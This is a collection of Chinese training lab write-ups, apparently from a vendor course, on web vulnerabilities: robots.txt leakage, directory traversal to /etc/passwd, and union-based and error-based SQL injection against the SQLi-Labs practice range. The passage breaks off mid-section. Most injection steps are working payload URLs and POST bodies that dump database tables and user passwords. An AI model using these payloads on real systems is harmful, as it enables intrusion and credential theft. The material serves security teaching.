[{"title":"某厂产业教育 - 常见Web安全漏洞","path":"/2024/09/13/红蓝攻防/ⅣR常见Web安全漏洞/","content":"Robots.txt文件利用实验目的通过本实验，掌握robots.txt文件的的介绍、作用以及利用方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/phpok/index.php 实验原理robots.txt文件介绍robots.txt是一个简单的以.txt结尾的文本文件，robots.txt文件本身没有什么漏洞。搜索引擎能够通过robots文件能够获知哪些页面能够爬取，哪些页面不能够爬取。但是如果robots.txt文件编辑的太过详细，反而会泄露网站的敏感目录或者文件，好比网站后台路径，从而得知其使用的系统类型，从而有针对性地进行利用。 robots.txt漏洞测试方法通过使用工具爬虫，对网站敏感文件目录进行扫描，对robots文件进行爬取。或者直接在url链接后添加&#x2F;robots.txt进行测试。 robots.txt漏洞危害攻击者可经过发现robots.txt文件，收集网站的敏感目录或文件，从而有针对性的进行利用。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/phpok/ 2、访问http://ip/phpok/robots.txt，检查Web站点根目录下是否存在robots.txt文件， 3、根据robots.txt文件中的路径，直接在域名后手工一一输入查看效果 4、其中datam目录下有一个install目录，点击进去发现数据库文件，点击下载 5、打开数据库文件查看，找到会员账户的敏感信息 6、对密码进行MD5解密，可得会员密码信息。比如对会员账户为admin的密码进行解密 7、在网站首页，点击登录，用获取的用户名密码登录 8、登录admin会员账号成功，可以查看admin会员的账户信息。 实验总结通过本实验，掌握在信息泄露中，通过Robots.txt文件泄露收集网站的敏感目录或文件，从而有针对性的进行利用。 目录遍历实验目的通过本实验，掌握目录遍历漏洞的原理以及危害。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip 实验原理目录遍历也称目录穿越，是一个常见的Web安全漏洞，攻击者可以利用该漏洞可以读取运行应用程序的服务器上的任意文件。这可能包括应用程序代码和数据，后端系统的登录信息以及敏感的操作系统文件。该漏洞最大的危害是能够让任意用户访问系统的敏感文件，继而攻陷整个服务器。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip，返回文件列表信息，说明存在目录遍历漏洞 2、任意点开文件或者文件夹，发现都可以打开 3、访问http://ip/include.php，页面一片空白；然后再访问http://ip/include.php?page=，页面仍然空白 4、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 5、切换到“Proxy”代理模块的“Options”，查看Bp的代理 6、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 7、刷新页面，重新发送请求，开始抓包 8、右键选择“Send to Repeater”或者“Ctrl+R”，将数据包发送到Repeater模块 9、切换到Repeater模块，利用“…&#x2F;”构造page参数为“…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd”，&#x2F;var&#x2F;www&#x2F;html&#x2F;…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd的效果等同于&#x2F;etc&#x2F;passwd 10、点击“Send”，发送构造的数据包，响应包显示&#x2F;etc&#x2F;passwd文件内容，实现目录穿越 实验总结通过本实验，掌握目录遍历漏洞的的验证方法、漏洞原理、漏洞利用以及漏洞危害，深入了解目录遍历漏洞。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - SQL注入漏洞原理与验证","path":"/2024/09/13/红蓝攻防/ⅤRSQL注入漏洞原理与验证/","content":"SQL注入-SQL数据库操作基础实验目的熟悉MySQL(MariaDB)数据库的基础与进阶语法，加深对SQL命令语句的理解，为后续SQL注入攻击与防护实验打下坚实的基础。 实验环境操作机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 MySQL(MariaDB)数据库帐号root，密码为空 实验原理MySQL(MariaDB)数据库基本命令的功能。 实验步骤第一部分：MySQL(MariaDB)基础操作1 连接数据库输入命令： 1mysql -u root -p 之后出现“Enter password:”的提示，由于root密码为空，此处直接按下回车键即可登录。 成功登录数据库后，会出现“MariaDB[(none)]”的提示符。 2 显示系统中所有数据库的名称输入命令： 1show databases; 注意：绝大部分SQL命令都以分号作为结束符，请不要遗漏！ 3 新建数据库student命令： 1create database student; 新建成功后，可再次使用下列命令查看结果： 1show databases; 4 使用数据库student命令： 1use student; 5 在数据库student中创建表result命令： 1create table result(id int(8),name varchar(20),city varchar(20),score int(5)); 6 在表result中增加数据本步骤在result中插入如下5行数据： 命令： 123456789insert into result(id,name,city,score) values(1,&quot;wang&quot;,&quot;beijing&quot;,75);insert into result(id,name,city,score) values(3,&quot;li&quot;,&quot;shanghai&quot;,80);insert into result(id,name,city,score) values(5,&quot;chen&quot;,&quot;fuzhou&quot;,70);insert into result(id,name,city,score) values(2,&quot;zhou&quot;,&quot;xian&quot;,90);insert into result(id,name,city,score) values(7,&quot;han&quot;,&quot;guangzhou&quot;,65); 注意：如果数据是字符型（varchar），必须使用单引号或者双引号包裹！ 插入成功后，可用如下命令查询result表中的全部内容： 1select * from result; 7 在表result中删除1条数据例如，删除id&#x3D;7的数据，可使用以下命令： 1delete from result where id=7; 删除成功后，仍然可以用以下命令查看结果： 1select * from result; 8 修改表result中的1条数据例如，修改id&#x3D;5的数据，将其score设置为60，可使用以下命令： 1update result set score=60 where id=5; 修改成功后，仍然可以用以下命令查看结果： 1select * from result; 9 查询表result中的数据例如： 12select * from result;//查询表中所有字段 12select name,score from result;//查询表中的name和score字段 12select score from result where name=&quot;li&quot;;//查询name为li的学生的分数 第二部分：MySQL(MariaDB)进阶操作1 order by的用法（1）将result表中的数据按照分数（score）从高到低进行排序： 1select * from result order by score desc； 其中，desc表示降序（递减）；如果从低到高（升序）进行排列，则可以将desc换成asc；如果不加此参数，默认情况下按升序方式排列。 （2）分别尝试以下命令： 1select id,name,score from result order by 1; 正常显示以id升序排列的结果。 1select id,name,score from result order by 2; 正常显示以name升序排列的结果！ 1select id,name,score from result order by 3; 正常显示以score升序排列的结果！ 1select id,name,score from result order by 4; 报错！ 从以上结果可以总结出，对于以下命令： 1select c1,c2,...,cn from result order by M; order by后面的数字（M）必须小于或等于n（数据库查询的字段数），才能正常显示。如果M&gt;n，数据库就会报错。可以利用这个特点判断数据库查询的字段数。 2 limit的用法基本格式为： 12345limit M,N//表示从第M+1条数据开始，顺序往下查询N条数据limit M//表示查询前M条数据 尝试执行以下两条命令： 12select * from result limit 0,2;//查询表中的前2条数据 12select id,name,score from result limit 1,3;//从第2条数据起，往下查询3条数据的id、name和score字段 3 union select的用法1（1）select * from result union select 1,2,3,4; 此语句的查询结果，即是select * from result和select 1,2,3,4查询结果的拼接。 （2）尝试执行以下3条语句： 1select id,name,score from result union select 1,2,3; 正常显示！ 1select id,name,score from result union select 1,2; 报错！ 1select id,name,score from result union select 1,2,3,4; 报错！ 从以上结果可以总结，对于以下命令： 1select c1,c2,...,cn from result union select d1,d2,...dm; 后半句union select查询的字段数（m）必须与前半句select查询的字段数（n）相等，数据库才能正常显示结果。与order by相似，可以利用这个特点判断数据库查询的字段数。 （3）尝试执行下列语句 1select id,city from result where id=1 and 1=2 union select name,score from result; 从以上结果可以总结，在已知字段名的情况下，攻击者只要将该字段置于任何能够显示的位置，就可以暴露该字段的值。 4 union select结合information_schema数据库MySQL（MariaDB）5.5以上版本自带information_schema数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。可以把information_schema数据库看作MySQL（MariaDB）的“目录”！ （1）尝试执行以下两条语句： 123show databases；select schema_name from information_schema.schemata; 两条语句执行结果相同！ （2）尝试执行以下两组语句： 第一组： 123use student;show tables; 第二组： 1select table_name from information_schema.tables where table_schema=&#x27;student&#x27;; 两组命令执行结果相同！ 实验总结通过本实验熟悉了SQL基本语法，为后面SQL注入学习打下深厚基础。完成实验后请思考：如何做好SQL数据库的安全运维工作，既保障数据库的正常运行，又不带来意外风险？ SQL注入-基于联合查询的数字型GET注入实验目的理解数字型GET注入的原理和特点，掌握利用联合查询（union select）的方法实现SQL注入的基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理数字型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=8，而服务器后端实际查询代码原型诸如：“select … from … where id&#x3D;$id…” 。攻击者可以通过构造恶意的GET输入参数，利用union select命令进行注入，暴露数据库中存储的信息。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-2为入口，利用联合查询（union select）的方式实施SQL注入，获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-2。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-2/ (注意大小写) 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 说明：本实验环境中FireFox浏览器已预安装Hackbar插件，在FireFox界面按下键盘上的F9键启用或停用（本实验环境中默认为启用状态）。建议在注入过程中用Hackbar插件来调整payload参数！ 2 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-2/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 运行后未正常显示！ 由上述结果可以判断，网站存在数字型注入点。 3 判断网站查询的字段数尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 1--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 2--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 3--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 4--+ 报错！ 由上述结果可以判断，网站查询的字段数为3。 4 判断网站的回显位置利用以下payload判断网站的回显位置： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,3--+ 执行的结果是：2号位和3号位可以回显！ 后面的步骤中，我们可以在2号位或3号位设置一些具有特殊功能的函数或命令来执行SQL注入！ 5 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,database()--+ 显示结果为security。 6 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 7 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+ 显示结果，users表中有id、username和password三个字段。 8 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1--+ 显示结果为Angelina，I-kill-you。 （3）显示第3组数据 1http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 2,1--+ 显示结果为Dummy，p@ssword。 … 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。 实验至此结束。 实验总结本次实验，成功实现了对存在数字型GET注入点的网站的手工SQL注入，掌握了基于联合查询的注入方法和流程。 SQL注入-基于联合查询的字符型GET注入实验目的理解字符型GET注入的原理和特点，掌握利用联合查询（union select）的方法实现SQL注入的基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理字符型GET注入，其注入点存在于URL中的GET参数处，如http://www.testweb.com/user.php?id=admin，而服务器后端实际查询代码原型诸如：“select … from … where id&#x3D;’$id’…” 。攻击者可以通过构造恶意的GET输入参数，利用union select命令进行注入，暴露数据库中存储的信息。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-1为入口，利用联合查询（union select）的方式实施SQL注入，获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-1。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-1/ (注意大小写) 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-1/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 说明：本实验环境中FireFox浏览器已预安装Hackbar插件，在FireFox界面按下键盘上的F9键启用或停用（本实验环境中默认为启用状态）。建议在注入过程中用Hackbar插件来调整payload参数！ 2 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后未正常显示！ 由上述结果可以判断，网站存在字符型注入点。 3 判断网站查询的字段数尝试使用以下payload获取网站查询的字段数（关键字order by）： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 1--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 2--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 3--+ 正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 4--+ 报错！ 由上述结果可以判断，网站查询的字段数为3。 4 判断网站的回显位置利用以下payload判断网站的回显位置： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,3--+ 执行的结果是：2号位和3号位可以回显！ 5 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,database()--+ 显示结果为security。 6 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 7 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+ 显示结果，users表中有id、username和password三个字段。 8 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1--+ 显示结果为Angelina，I-kill-you。 （3）显示第3组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 2,1--+ 显示结果为Dummy，p@ssword。 … 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。 实验总结本次实验，成功实现了对存在字符型GET注入点的网站的手工SQL注入，掌握了基于联合查询的注入方法和流程。 SQL注入-基于联合查询的POST注入实验目的理解POST注入的原理和特点，掌握利用联合查询（union select）的方法实现SQL注入的基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理POST注入，其注入点存在于POST表单中的参数处。攻击者可以通过代理抓包工具（如Burpsuite）拦截并修改POST表单中的参数，利用union select命令进行注入，暴露数据库中存储的信息。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-11为入口，利用联合查询（union select）的方式实施SQL注入，获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-11。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-11/ (注意大小写) 2 利用Burpsuite工具抓包（1）启动Burpsuite 在攻击机Pentest-Atk的桌面文件夹Burp中，鼠标左键双击BURP.cmd程序，启动Burpsuite。 （2）设置Burpsuite的代理服务端口 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Options”，在Proxy Listeners模块下，将Burpsuite的代理服务端口设置为8080（此为Burpsuite默认的服务端口）。 （3）开启Burpsuite的代理拦截功能 在Burpsuite软件界面上选择选项卡“Proxy”-&gt;“Intercept”，将拦截开关按钮的状态设置为“Intercept is on”。 注意：上述设置完成之后，不要关闭Burpsuite！ （4）设置Firefox代理 回到FireFox浏览器界面，鼠标右键单击浏览器地址栏右方的FoxyProxy插件图标按钮，在弹出的菜单中选择“为全部URLs启用代理服务器127.0.0.1:8080”: 代理设置成功后，FoxyProxy插件图标会变成蓝色。 （5）利用Burpsuite工具拦截HTTP请求包 在FireFox浏览器访问的Less-11登录验证界面，输入用户名admin、密码任意（本例中为1），然后点击Submit按钮， 此时Burpsuite会拦截到HTTP请求包： （6）将Burpsuite工具拦截到的HTTP请求包发送至Repeater模块。 选中拦截到的HTTP请求包全部内容，单击鼠标右键，在弹出的菜单中选择“Send to Repeater”，将其发送给Burpsuite的Repeater模块。 发送成功后，在Burpsuite的Repeater选项卡下能够看到刚刚拦截的HTTP请求包内容。 后续的步骤中，可以在Repeater选项卡下的Request栏中设置注入的payload，设置完成后点击Send按钮发送，并在Response栏中观察目标服务器的响应。 3 寻找注入点在POST表单处，分别使用以下2条payload寻找注入点及判断注入点的类型： 1uname=admin&#x27;&amp;passwd=1&amp;submit=Submit 报错！ 1uname=admin&#x27;#&amp;passwd=1&amp;submit=Submit 目标正常回显用户名和密码！ 由此可以判断，目标网站在POST参数处存在字符型注入点。 4 判断网站查询的字段数尝试使用以下payload获取网站查询的字段数（关键字order by）： 1uname=admin&#x27; order by 1#&amp;passwd=1&amp;submit=Submit 目标正常回显用户名和密码！ 1uname=admin&#x27; order by 2#&amp;passwd=1&amp;submit=Submit 目标正常回显用户名和密码！ 1uname=admin&#x27; order by 3#&amp;passwd=1&amp;submit=Submit 报错！ 由此可以判断，网站查询的字段数为2。 5 判断网站的回显位置利用以下payload判断网站的回显位置： 1uname=admin&#x27; and 1=2 union select 1,2#&amp;passwd=1&amp;submit=Submit 运行结果，1号位和2号位均可以回显！ 6 获取网站当前所在数据库的库名利用以下payload获取网站当前所在数据库的库名： 1uname=admin&#x27; and 1=2 union select 1,database()#&amp;passwd=1&amp;submit=Submit 显示结果为security。 7 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1uname=admin&#x27; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#&amp;passwd=1&amp;submit=Submit 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 8 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1uname=admin&#x27; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit 显示结果，users表中有id、username和password三个字段。 9 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1uname=admin&#x27; and 1=2 union select 1,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1#&amp;passwd=1&amp;submit=Submit 显示结果为Dump，Dump。 （2）显示第2组数据 1uname=admin&#x27; and 1=2 union select 1,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1#&amp;passwd=1&amp;submit=Submit 显示结果为Angelina，I-kill-you。 （3）显示第3组数据 1uname=admin&#x27; and 1=2 union select 1,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 2,1#&amp;passwd=1&amp;submit=Submit 显示结果为Dummy，p@ssword。 … 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。实验至此结束。 实验总结本次实验，成功实现了对存在POST注入点的网站的手工SQL注入，掌握了基于联合查询的注入方法和流程。 SQL注入-基于报错的注入1实验目的熟悉报错功能函数extractvalue()的用法，掌握基于报错的SQL注入基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理（1）关于报错注入 基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。 常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。 （2）关于extractvalue()函数 作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。语法：extractvalue(XML_document, XPath_string)参数1：XML_document是String格式，为XML文档对象的名称；参数2：XPath_string(Xpath格式的字符串)，注入时可操作的地方。报错原理：xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：XPATH syntax error:’xxxxxxxx’。 实验步骤本实验的目标是：以SQLi-Labs网站的Less-1为入口，借助extractvalue()函数，利用基于报错的注入方式获取SQLi-Labs网站的登录用户名和密码。 1 访问SQLi-Labs网站在攻击机Pentest-Atk打开FireFox浏览器，并访问靶机A-SQLi-Labs上的SQLi-Labs网站Less-1。访问的URL为： 1http://[靶机IP]/sqli-labs/Less-1/ (注意大小写) 登录后，根据网页提示，先给定一个GET参数，即： 1http://[靶机IP]/sqli-labs/Less-1/?id=1 此时页面显示id&#x3D;1的用户名Dump、密码Dump。 说明：本实验环境中FireFox浏览器已预安装Hackbar插件，在FireFox界面按下键盘上的F9键启用或停用（本实验环境中默认为启用状态）。建议在注入过程中用Hackbar插件来调整payload参数！ 2 寻找注入点分别使用以下3条payload寻找注入点及判断注入点的类型： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; 运行后报错！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1 运行后正常显示！ 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2 运行后未正常显示！ 由上述结果可以判断，网站存在字符型注入点。 3 获取网站当前所在数据库的库名使用以下payload获取网站当前所在数据库的库名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database()))--+ 显示结果为security。 4 获取数据库security的全部表名使用以下payload获取数据库security的全部表名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))--+ 显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。 注意：extractvalue() 函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)))--+//显示security库中的第1张表的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1)))--+//显示security库中的第2张表的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 2,1)))--+//显示security库中的第3张表的名字... 5 获取users表的全部字段名使用以下payload获取users表的全部字段名： 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)))--+ 显示结果，users表中有id、username和password三个字段。 同上一个步骤相似，为了避免错误信息太长导致显示不全，有时需要借助limit来做分行显示，上述payload可以改为： 12345678910http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1)))--+//显示users表中的第1个字段的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 1,1)))--+//显示users表中的第2个字段的名字http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1)))--+//显示users表中的第3个字段的名字... 6 获取users表id、username和password字段的全部值。由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如 （1）显示第1组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1)))--+ 显示结果为Dump，Dump。 （2）显示第2组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1)))--+ 显示结果为Angelina，I-kill-you。 （3）显示第3组数据 1http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 2,1)))--+ 显示结果为Dummy，p@ssword。 … 以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。 实验至此结束。 实验总结本次实验，成功实现了对存在字符型GET注入点的网站的手工SQL注入，熟悉了extractvalue()函数的用法，掌握了基于报错的注入方法和流程。 SQL注入-基于报错的注入2实验目的熟悉报错功能函数floor()的用法，掌握基于报错的SQL注入基本流程。 实验环境攻击机：Pentest-Atk（1）操作系统：Windows 10 （2）安装的应用软件：Sqlmap、Burpsuite、FireFox浏览器插件Hackbar、FoxyProxy等 （3）登录账号密码：操作系统帐号Administrator，密码Sangfor!7890 靶机：A-SQLi-Labs（1）操作系统：CentOS 7 （2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境 （3）登录账号密码：操作系统帐号root，密码Sangfor!7890 实验原理（1）关于报错注入 基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。报错注入一般需要具备两个前提条件：（1）Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；（2）后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。 （2）关于floor()函数 在进行报错注入时，floor()函数一般需要与rand()、count()、group by联用。作用：floor(x)：对参数x向下取整；rand()：生成一个0~1之间的随机浮点数；count(*)：统计某个表下总共有多少条记录；group by 